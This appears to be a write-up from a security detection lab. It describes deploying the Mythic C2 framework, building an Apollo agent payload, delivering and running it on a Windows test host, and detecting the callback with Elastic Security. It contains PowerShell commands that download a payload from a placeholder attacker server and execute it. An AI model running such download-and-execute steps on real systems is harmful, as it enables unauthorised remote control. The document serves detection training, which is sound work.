---

## **Complete Mythic Command and Control Simulation Workflow**

This section documents the **full process used to generate command-and-control (C2) traffic** within the SOC Detection Lab using the Mythic framework and the Apollo agent. The goal of this workflow was to simulate a realistic post-exploitation scenario that generates endpoint telemetry observable by the Elastic Security monitoring platform.

The process includes **C2 server deployment, payload creation, payload delivery, execution, callback registration, and telemetry generation**, all of which contribute to triggering detection rules within the SIEM.

---

## **Step 1 — Clone the Mythic Repository**

The Mythic framework was installed on a dedicated Linux virtual machine used to simulate attacker infrastructure.

```bash
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
```

This command downloads the Mythic framework and moves into the installation directory.

---

## **Step 2 — Install Dependencies**

Mythic relies on Docker containers and several supporting services. The following script installs Docker, required packages, and prepares the environment.

```bash
sudo ./install_docker_ubuntu.sh
```

This script performs the following tasks:

- Installs Docker and Docker Compose
- Configures required dependencies
- Prepares the system to run Mythic containers

---

## **Step 3 — Start Mythic Services**

Once dependencies are installed, Mythic services are started using the CLI tool.

```bash
sudo ./mythic-cli start
```

This command launches several containers including:

- Mythic application server
- PostgreSQL database
- RabbitMQ message queue
- Payload service containers
- Agent communication services

After the services start, the Mythic web interface becomes available.

---

## **Step 4 — Access the Mythic Web Interface**

Once the services are running, the operator connects to the Mythic web interface from a browser.

```
http://<MYTHIC_SERVER_IP>:7443
```

The web interface is used to:

- Generate payloads
- Manage agents
- Execute commands on compromised hosts
- Monitor active callbacks

---

## **Step 5 — Install the Apollo Agent**

Mythic supports multiple agents. In this lab environment, the **Apollo agent** was installed to simulate a Windows-based compromise.

The Apollo payload type was enabled through the Mythic interface or CLI.

This allows operators to generate Windows payloads capable of executing commands and maintaining remote access.

---

## **Step 6 — Generate the Payload**

A payload was generated within the Mythic interface using the Apollo agent configuration.

The payload was configured with:

- Callback address pointing to the Mythic server
- Communication profile
- Agent configuration parameters

Once generated, the payload executable was saved on the Mythic server.

---

## **Step 7 — Host the Payload for Delivery**

To deliver the payload to the Windows endpoint, a temporary HTTP server was launched on the Mythic server.

```bash
python3 -m http.server 8000
```

This command exposes the payload file over HTTP so it can be downloaded by the target system.

The payload becomes accessible at:

```
http://<MYTHIC_SERVER_IP>:8000/<PAYLOAD_FILE>
```

---

## **Step 8 — Download the Payload on the Target System**

From the Windows endpoint, a PowerShell command was used to retrieve the payload.

```powershell
Invoke-WebRequest -Uri http://<MYTHIC_SERVER_IP>:8000/<PAYLOAD_FILE> -OutFile payload.exe
```

This command downloads the payload from the Mythic server to the local machine.

---

## **Step 9 — Execute the Payload**

Once downloaded, the payload was executed on the Windows host.

```powershell
Start-Process payload.exe
```

Executing the payload initiates the agent runtime and begins the callback process to the Mythic server.

---

## **Step 10 — Agent Callback Registration**

After execution, the Apollo agent attempts to connect back to the Mythic server using the configured callback settings.

When the connection succeeds:

- The compromised host registers as a new agent
- The host appears in the Mythic dashboard
- The operator gains command execution capability

This step confirms that the command-and-control channel has been established.

---

## **Step 11 — Generate Post-Exploitation Activity**

Once the agent is active, commands can be executed from the Mythic interface.

Examples of commands used to generate telemetry include:

- Running system commands
- Listing directories
- Executing processes

These activities create observable telemetry on the endpoint.

---

## **Step 12 — Telemetry Collection by Elastic Agent**

The monitored endpoint runs the **Elastic Agent**, which collects system telemetry including:

- Process creation events
- Command-line execution
- Network connection logs
- Parent-child process relationships

These logs are forwarded to Elasticsearch for analysis.

---

## **Step 13 — Detection Rule Trigger**

The Mythic detection rule monitors endpoint telemetry for indicators associated with Apollo agent activity.

Once the suspicious process or command execution is detected, Elastic Security generates an alert.

The alert includes investigation context such as:

- Host where the activity occurred
- Suspicious executable path
- Command-line parameters
- Timestamp of execution

---

## **Step 14 — SOC Investigation Workflow**

After the alert is generated, analysts can investigate the activity within Kibana by reviewing:

- Endpoint telemetry
- Process execution timeline
- Related alerts
- Network activity

This investigation process simulates the workflow used by security operations teams when responding to command-and-control alerts.

---


## **Purpose of the Simulation**

This simulation demonstrates how command-and-control activity can be generated and detected inside a monitored environment.

By reproducing the full lifecycle of a compromised host communicating with attacker infrastructure, the SOC Detection Lab demonstrates how endpoint telemetry and detection rules can identify post-exploitation activity and support security investigations.
